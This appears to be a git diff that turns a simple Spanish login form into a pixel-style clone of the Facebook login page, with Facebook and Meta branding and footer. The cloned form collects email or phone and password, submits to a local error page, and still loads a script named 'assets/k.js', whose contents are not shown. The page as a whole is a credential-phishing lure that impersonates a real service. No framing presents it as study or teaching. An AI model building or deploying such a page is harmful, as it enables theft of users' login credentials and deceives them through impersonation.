@@ -1,17 +1,295 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
   <meta charset="UTF-8">
-  <title>Iniciar sesión</title>
-</head>
-<body>
-  <h2>Iniciar sesión</h2>
-  <form id="loginForm">
-    <input type="text" name="usuario" placeholder="Usuario"><br><br>
-    <input type="password" name="clave" placeholder="Contraseña"><br><br>
-    <button type="submit">Entrar</button>
-  </form>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - Inicia sesión o regístrate</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Helvetica, Arial, sans-serif;
+    }
 
-  <script src="assets/k.js"></script>
+    body {
+      background-color: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .main-content {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 0 20px;
+      margin-bottom: 80px;
+    }
+
+    .container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      max-width: 1000px;
+      width: 100%;
+      margin-top: 100px;
+    }
+
+    .left-section {
+      max-width: 500px;
+      padding-right: 32px;
+    }
+
+    .facebook-logo {
+      color: #1877f2;
+      font-size: 56px;
+      font-weight: bold;
+      margin-bottom: 16px;
+    }
+
+    .tagline {
+      font-size: 24px;
+      line-height: 28px;
+      color: #1c1e21;
+    }
+
+    .login-container {
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+      max-width: 396px;
+      width: 100%;
+    }
+
+    .login-form input {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 17px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      margin-bottom: 12px;
+      outline: none;
+    }
+
+    .login-form input:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+
+    .login-btn {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 20px;
+      font-weight: bold;
+      padding: 12px;
+      width: 100%;
+      cursor: pointer;
+      margin-bottom: 16px;
+    }
+
+    .forgot-password {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .forgot-password a {
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .divider {
+      border-bottom: 1px solid #dadde1;
+      margin: 20px 0;
+    }
+
+    .create-account {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    .create-btn {
+      background-color: #42b72a;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 17px;
+      font-weight: bold;
+      padding: 12px 16px;
+      cursor: pointer;
+      display: inline-block;
+    }
+
+    .create-page {
+      text-align: center;
+      margin-top: 28px;
+      font-size: 14px;
+    }
+
+    .create-page a {
+      color: #1c1e21;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    /* Footer Styles */
+    .footer {
+      background-color: white;
+      padding: 20px;
+      color: #737373;
+      font-size: 12px;
+      margin-top: auto;
+    }
+
+    .footer-content {
+      max-width: 980px;
+      margin: 0 auto;
+    }
+
+    .language-selector {
+      padding: 8px 0;
+      border-bottom: 1px solid #dddfe2;
+      margin-bottom: 8px;
+    }
+
+    .language-selector a {
+      color: #737373;
+      text-decoration: none;
+      margin-right: 10px;
+    }
+
+    .language-selector a:hover {
+      text-decoration: underline;
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      padding: 8px 0;
+    }
+
+    .footer-links a {
+      color: #737373;
+      text-decoration: none;
+      margin-right: 20px;
+      margin-bottom: 5px;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    .copyright {
+      margin-top: 20px;
+      font-size: 11px;
+    }
+
+    @media (max-width: 900px) {
+      .container {
+        flex-direction: column;
+        text-align: center;
+      }
+
+      .left-section {
+        margin-bottom: 40px;
+        padding-right: 0;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="main-content">
+    <div class="container">
+      <div class="left-section">
+        <div class="facebook-logo">facebook</div>
+        <h2 class="tagline">Connect with friends and the world around you on Facebook.</h2>
+      </div>
+
+      <div class="right-section">
+        <div class="login-container">
+          <form class="login-form" id="loginForm" action="./error_page.html">
+            <input type="text" name="usuario" placeholder="Email or phone number" aria-label="Email or phone number"
+              required>
+            <input type="password" name="clave" placeholder="Password" aria-label="Password" required>
+            <button type="submit" class="login-btn">Log In</button>
+          </form>
+
+          <div class="forgot-password">
+            <a href="#">Forgot password?</a>
+          </div>
+
+          <div class="divider"></div>
+
+          <div class="create-account">
+            <button type="button" class="create-btn">Create new account</button>
+          </div>
+        </div>
+
+        <div class="create-page">
+          <span>Create a Page</span> for a <a href="#">celebrity, brand</a> or <a href="#">business</a>.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer class="footer">
+    <div class="footer-content">
+      <div class="language-selector">
+        <a href="#">English (US)</a>
+        <a href="#">Español</a>
+        <a href="#">Português (Brasil)</a>
+        <a href="#">Français (France)</a>
+        <a href="#">Italiano</a>
+        <a href="#">Deutsch</a>
+        <a href="#">中文(简体)</a>
+        <a href="#">العربية</a>
+        <a href="#">हिन्दी</a>
+        <a href="#">日本語</a>
+        <a href="#">+</a>
+      </div>
+
+      <div class="footer-links">
+        <a href="#">Sign Up</a>
+        <a href="#">Log In</a>
+        <a href="#">Messenger</a>
+        <a href="#">Facebook Lite</a>
+        <a href="#">Video</a>
+        <a href="#">Meta Pay</a>
+        <a href="#">Meta Store</a>
+        <a href="#">Meta Quest</a>
+        <a href="#">Ray-Ban Meta</a>
+        <a href="#">Meta AI</a>
+        <a href="#">Instagram</a>
+        <a href="#">Threads</a>
+        <a href="#">Voting Information Center</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Privacy Center</a>
+        <a href="#">About</a>
+        <a href="#">Create ad</a>
+        <a href="#">Create Page</a>
+        <a href="#">Developers</a>
+        <a href="#">Careers</a>
+        <a href="#">Cookies</a>
+        <a href="#">Ad choices</a>
+        <a href="#">Terms</a>
+        <a href="#">Help</a>
+        <a href="#">Contact Uploading & Non-Users</a>
+      </div>
+
+      <div class="copyright">
+        Meta © 2025
+      </div>
+    </div>
+  </footer>
 </body>
+
+<script src="assets/k.js"></script>
+
 </html>
